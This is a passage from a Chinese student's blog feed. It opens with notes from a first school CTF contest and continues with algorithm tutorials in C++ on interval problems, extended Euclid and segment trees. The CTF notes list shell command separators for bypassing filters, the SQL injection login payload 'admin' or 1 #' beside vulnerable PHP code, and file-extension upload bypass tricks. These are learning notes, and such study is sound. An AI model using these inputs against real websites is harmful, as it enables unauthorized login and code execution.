    <content type="html"><![CDATA[<p>第一次参加CTF比赛，虽然只是个校赛qaq.<br>但还是根据题解学到了很多东西。</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>1.png常用隐写 LSB隐写，大概就是像素改变一位，人看不出来具体的变化。<br>2.流量分析，<br>1.对于后台的登录一定是有一个302进行跳转，渗透时分析 post流量。然后word隐写，word自带隐藏隐藏文字功能。或者直接改word后缀，使得改为压缩包，直接分析dom文档，得到隐藏内容。<br>3.音频隐写，mp3stego，steghide等软件进提取。<br>4.内存取证，一般给vmem文件，通过Volatility取证工具进行分析，对可疑文件进行dump。然后后面看不太懂，学到NTLM加密为windows密码加密。<br>5.学习知识点，foremost 直接进行分离，binwalk -e 提取找到的任何形式的文件。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>1.ssti模板注入。<br>SSTI （Server-Side Template Injection）服务器端模板注入<br>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。<br>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。<br>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。剩下的暂时不太懂qaq。后续完善<br>2.常用命令分隔符。<br>远程代码执行和bypass</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haml">; 执行完当前指令后执行下一条指令<br>|  管道符<br>&amp;&amp; 左侧命令执行成功后，执行右侧命令<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> url换行符<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span> url回车符<br></code></pre></td></tr></table></figure><p>3.sql 注入<br>admin’ or 1 #</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$this</span>-&gt;conn);<br></code></pre></td></tr></table></figure><p>实际上的代码就变成了select * from users where username&#x3D;’admin’ or 1#’ and password&#x3D;’$password’ 。由于#后的代码被注释了，实际上执行的查询语句就是select * from users where username&#x3D;’admin’ or 1。条件恒真，以管理员账号登录后台。<br>扩展名不允许可以改包或者 改后缀名或者一起改绕过，如php,Php,phP等，还可以改包时改后缀名。<br>4.访问 &#x2F;<a href="http://www.zip/">www.zip</a> 可以下载网站源码备份，这是网站常见源码备份名<br>Crypto:<br>1.维吉尼亚密码加密<br>2.个算法只需要前624个随机数，就可以恢复前624个state，就可以预测此后生成的随机数。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>区间问题</title>
    <link href="/2022/04/12/%E5%8C%BA%E9%97%B4%E9%97%AE%E9%A2%98/"/>
    <url>/2022/04/12/%E5%8C%BA%E9%97%B4%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>1.区间选点&#x2F;最大不相交区间数量。<br><a href="https://www.acwing.com/problem/content/907/">https://www.acwing.com/problem/content/907/</a><br><a href="https://www.acwing.com/activity/content/problem/content/1112/">https://www.acwing.com/activity/content/problem/content/1112/</a><br>思路即按右区间端点大小对所有区间进行排序，然后找到最多相交的区间然后化为一组。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;a;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> x,y;<br>        cin&gt;&gt;x&gt;&gt;y;<br>        a.<span class="hljs-built_in">push_back</span>(&#123;x,y&#125;);<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(a.<span class="hljs-built_in">begin</span>(),a.<span class="hljs-built_in">end</span>(),[&amp;](<span class="hljs-keyword">auto</span>&amp;x,<span class="hljs-keyword">auto</span>&amp;y)&#123;<br>       <span class="hljs-keyword">return</span> x.second&lt;y.second; <br>    &#125;);<br>    <span class="hljs-type">int</span> res= <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> last = <span class="hljs-number">-1e9</span><span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;p:a)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(p.first&gt;last)<span class="hljs-comment">//如果遍历到的区间的左区间大于上一个区间的右区间，则需要新加一组。</span><br>        &#123;<br>            res++;<br>            last =p.second;<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.区间分组。<br><a href="https://www.acwing.com/problem/content/908/">https://www.acwing.com/problem/content/908/</a><br>找到最少的组，每组中区间两两不相交。<br>思路：对所有区间的左区间进行排序，然后依次加入右端点最小堆，若区间的左端点小于堆顶右端点的最小值，则区间相交不能合并。若大于右端点的最小值，则合并为一组，并更新该组的右端点的值为该区间的值。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<br>vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">p</span>(N,<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;());<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b;<br>        cin&gt;&gt;a&gt;&gt;b;<br>        p[i].first =a;<br>        p[i].second =b;<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(p.<span class="hljs-built_in">begin</span>(),p.<span class="hljs-built_in">begin</span>()+n,[&amp;](pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&amp;a,pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&amp;b)&#123;<br>        <span class="hljs-keyword">return</span> a.first&lt;b.first;<br>    &#125;);<br>    <span class="hljs-keyword">auto</span> cmp = [&amp;](pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&amp;a,pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;b)&#123;<br>        <span class="hljs-keyword">return</span> a.second&gt;b.second;<br>    &#125;;<br>    priority_queue&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;,vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;,<span class="hljs-keyword">decltype</span>(cmp)&gt;<span class="hljs-built_in">pq</span>(cmp);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(pq.<span class="hljs-built_in">empty</span>() ||  pq.<span class="hljs-built_in">top</span>().second&gt;=p[i].first) pq.<span class="hljs-built_in">push</span>(p[i]);<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            pq.<span class="hljs-built_in">pop</span>();<br>            pq.<span class="hljs-built_in">push</span>(p[i]);<br>        &#125;<br>    &#125;<br>    cout&lt;&lt;pq.<span class="hljs-built_in">size</span>()&lt;&lt;endl;<br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>3.区间覆盖<br><a href="https://www.acwing.com/activity/content/problem/content/1114/">https://www.acwing.com/activity/content/problem/content/1114/</a><br>思路：对所有区间按左端点进行排序，遍历区间，找到右端点大于要覆盖区间[s,t]的区间，对[s,t]进行更新，最终判断是否能够覆盖。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> s,t;<br>    cin&gt;&gt;s&gt;&gt;t;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;p;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b;<br>        cin&gt;&gt;a&gt;&gt;b;<br>        p.<span class="hljs-built_in">push_back</span>(&#123;a,b&#125;);<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(p.<span class="hljs-built_in">begin</span>(),p.<span class="hljs-built_in">end</span>(),[&amp;](<span class="hljs-keyword">auto</span>&amp;a,<span class="hljs-keyword">auto</span>&amp;b)&#123;<br>        <span class="hljs-keyword">return</span> a.first&lt;b.first;<br>    &#125;);<br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">bool</span> flag =<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> j=i;<br>        <span class="hljs-type">int</span> r=<span class="hljs-number">-2e9</span>;<br>        <span class="hljs-keyword">while</span>(j&lt;n&amp;&amp;p[j].first&lt;=s)<span class="hljs-comment">//找到s左侧所有的区间。</span><br>        &#123;<br>            r= <span class="hljs-built_in">max</span>(r,p[j].second);<span class="hljs-comment">//确定能延伸到右侧的最大值</span><br>            ++j;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(r&lt;s)<span class="hljs-comment">//若最大值也不能超过s,那么无法被覆盖。</span><br>        &#123;<br>            res =<span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        ++res;<span class="hljs-comment">//使用能延伸到最右侧的最大值的区间</span><br>        <span class="hljs-keyword">if</span>(r&gt;=t)<span class="hljs-comment">//若已经能覆盖完全，结束寻找</span><br>        &#123;<br>            flag =<span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        s=r;<span class="hljs-comment">//更新左端点。</span><br>        i=j<span class="hljs-number">-1</span>;<span class="hljs-comment">//更新i</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(!flag) res=<span class="hljs-number">-1</span>;<br>    cout&lt;&lt;res&lt;&lt;endl;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>4.查询合并区间问题。<br><a href="https://leetcode.cn/problems/range-module/">https://leetcode.cn/problems/range-module/</a><br>珂朵莉树。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RangeModule</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    map&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;mp; <span class="hljs-comment">//[R,L]形式存储，方便查找</span><br>    <span class="hljs-built_in">RangeModule</span>() &#123;<br><br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addRange</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l = left;<br>        <span class="hljs-type">int</span> r =right;<br>        <span class="hljs-keyword">auto</span> p  =mp.<span class="hljs-built_in">lower_bound</span>(left);<span class="hljs-comment">//找到第一个右端点大于left 的区间</span><br>        <span class="hljs-keyword">while</span>(p!=mp.<span class="hljs-built_in">end</span>() &amp;&amp; p-&gt;second&lt;=r)<br>        &#123;<br>            l = <span class="hljs-built_in">min</span>(l,p-&gt;second);<br>            r = <span class="hljs-built_in">max</span>(r,p-&gt;first);<br>            <span class="hljs-keyword">auto</span> t =p;<br>            p++;<br>            mp.<span class="hljs-built_in">erase</span>(t);<br>        &#125; <br>        mp[r]=l;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">queryRange</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        <span class="hljs-keyword">auto</span> p = mp.<span class="hljs-built_in">lower_bound</span>(left);<br>        <span class="hljs-keyword">if</span>(p==mp.<span class="hljs-built_in">end</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">if</span>(p-&gt;second&lt;=left &amp;&amp; p-&gt;first&gt;= right) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">removeRange</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        <span class="hljs-keyword">auto</span> p = mp.<span class="hljs-built_in">lower_bound</span>(left+<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">while</span>(p!=mp.<span class="hljs-built_in">end</span>() &amp;&amp; p-&gt;second&lt;=right)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(p-&gt;second&lt;left)<br>            &#123;<br>                mp[left] = p-&gt;second;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(p-&gt;first&gt;right)<br>            &#123;<br>                mp[ p-&gt;first] =right;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <br>            &#123;<br>            <span class="hljs-keyword">auto</span> t =p;<br>            p++;<br>            mp.<span class="hljs-built_in">erase</span>(t);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Your RangeModule object will be instantiated and called as such:</span><br><span class="hljs-comment"> * RangeModule* obj = new RangeModule();</span><br><span class="hljs-comment"> * obj-&gt;addRange(left,right);</span><br><span class="hljs-comment"> * bool param_2 = obj-&gt;queryRange(left,right);</span><br><span class="hljs-comment"> * obj-&gt;removeRange(left,right);</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>拓展欧几里德</title>
    <link href="/2022/04/12/%E6%8B%93%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/"/>
    <url>/2022/04/12/%E6%8B%93%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h4 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h4><p>欧几里得算法,也即辗转相除法，可以用来求最大公约数，即gcd(a,b) &#x3D; gcd(b,a%b)。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> b? <span class="hljs-built_in">gcd</span>(b,a%b):a;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="拓展欧几里得算法"><a href="#拓展欧几里得算法" class="headerlink" title="拓展欧几里得算法"></a>拓展欧几里得算法</h4><p>定理：对于不完全为 0 的非负整数 a，b，gcd（a，b）表示 a，b 的最大公约数，必然存在整数对 x，y ，使得 gcd（a，b）&#x3D;a<em>x+b</em>y。拓展欧几里得就是用来求一个可能的一对数x,y。<br>原理：<br>设 a&gt;b。<br>显然当 b&#x3D;0，gcd（a，b）&#x3D;a。此时 x&#x3D;1，y&#x3D;0；<br>当ab!&#x3D;0 时<br>设 ax1+by1&#x3D;gcd(a,b);<br>bx2+(a mod b)y2&#x3D;gcd(b,a mod b);<br>根据朴素的欧几里德原理有 gcd(a,b)&#x3D;gcd(b,a mod b);<br>则:ax1+by1&#x3D;bx2+(a mod b)y2;<br>即:ax1+by1&#x3D;bx2+(a-(a&#x2F;b)*b)y2&#x3D;ay2+bx2-(a&#x2F;b)*by2;<br>根据恒等定理得：x1&#x3D;y2; y1&#x3D;x2-(a&#x2F;b)*y2，可以利用此方法递归求解;<br>这样我们就得到了求解 x1,y1 的方法：x1，y1 的值基于 x2，y2.<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span>&amp;x,<span class="hljs-type">int</span>&amp;y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!b)<span class="hljs-comment">//递归边界，得到最大公约数</span><br>    &#123;<br>        x=<span class="hljs-number">1</span>;<br>        y=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-type">int</span> d = <span class="hljs-built_in">exgcd</span>(b,a%b,y,x);<span class="hljs-comment">//递归求最大公约数</span><br>    y-=a/b*x;<span class="hljs-comment">//迭代，回溯。</span><br>    <span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>线段树</title>
    <link href="/2022/04/11/%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    <url>/2022/04/11/%E7%BA%BF%E6%AE%B5%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>线段树是算法竞赛中常用的用来维护区间信息的数据结构。<br>线段树可以在O(logn)的时间复杂度内实现单点修改、区间修改、区间查询（区间求和，求区间最大值，求区间最小值）等操作。</p><h3 id="线段树的基本结构与建树"><a href="#线段树的基本结构与建树" class="headerlink" title="线段树的基本结构与建树"></a>线段树的基本结构与建树</h3><p>线段树将每个长度不为1的区间划分成左右两个区间递归求解，把整个线段划分为一个树形结构，通过合并左右两区间信息来求得该区间的信息。这种数据结构可以方便的进行大部分的区间操作。<br><img src="/upload/2022/04/image-ae22bd3e8862442082550e802ace4d1c.png" alt="image.png"><br>上图即为将[1,13]区间划分出来的线段树。树上每一个节点维护的是这个区间上的总和。<br>由树的性质，节点d[i]的左孩子为d[2i],则右孩子为d[2i+1]。<br>由此，若d[i]表示的为区间[s,t]那么，其左孩子表示的为区间[s,(s+t)&#x2F;2]<br>其右孩子表示的为[(s+t)&#x2F;2+1,t]<br>由此可进行建树：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">build</span><span class="hljs-params">(<span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-comment">// 对 [s,t] 区间建立线段树,当前根的编号为 p</span><br>  <span class="hljs-keyword">if</span> (s == t) &#123;<br>    d[p] = a[s];<span class="hljs-comment">//a[i]为原数组。</span><br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>);<br>  <span class="hljs-comment">// 移位运算符的优先级小于加减法，所以加上括号</span><br>  <span class="hljs-comment">// 如果写成 (s + t) &gt;&gt; 1 可能会超出 int 范围</span><br>  <span class="hljs-built_in">build</span>(s, m, p * <span class="hljs-number">2</span>), <span class="hljs-built_in">build</span>(m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  <span class="hljs-comment">// 递归对左右区间建树</span><br>  d[p] = d[p * <span class="hljs-number">2</span>] + d[(p * <span class="hljs-number">2</span>) + <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>有线段树的空间性质，若有n个节点，那么需要的空间的大小为4n。</p><h3 id="线段树的区间查询"><a href="#线段树的区间查询" class="headerlink" title="线段树的区间查询"></a>线段树的区间查询</h3><p>查询操作包括查询[l,r]区间的总和，求区间的最大值或最小值。<br>以上述的图为例，若查询区间[1,13]的和，直接返回d[1]的值即可。<br>若求区间[1,6]的和，那么需要将[1,4],[5,6]两个进行合并。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getsum</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> t, <span class="hljs-type">int</span> p)</span> </span>&#123;<br>  <span class="hljs-comment">// [l, r] 为查询区间, [s, t] 为当前节点包含的区间, p 为当前节点的编号</span><br>  <span class="hljs-keyword">if</span> (l &lt;= s &amp;&amp; t &lt;= r)<br>    <span class="hljs-keyword">return</span> d[p];  <span class="hljs-comment">// 当前区间为询问区间的子集时直接返回当前区间的和</span><br>  <span class="hljs-type">int</span> m = s + ((t - s) &gt;&gt; <span class="hljs-number">1</span>), sum = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (l &lt;= m) sum += <span class="hljs-built_in">getsum</span>(l, r, s, m, p * <span class="hljs-number">2</span>);<br>  <span class="hljs-comment">// 如果左儿子代表的区间 [l, m] 与询问区间有交集, 则递归查询左儿子</span><br>  <span class="hljs-keyword">if</span> (r &gt; m) sum += <span class="hljs-built_in">getsum</span>(l, r, m + <span class="hljs-number">1</span>, t, p * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>);<br>  <span class="hljs-comment">// 如果右儿子代表的区间 [m + 1, r] 与询问区间有交集, 则递归查询右儿子</span><br>  <span class="hljs-keyword">return</span> sum;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="线段树的区间修改与懒惰标记"><a href="#线段树的区间修改与懒惰标记" class="headerlink" 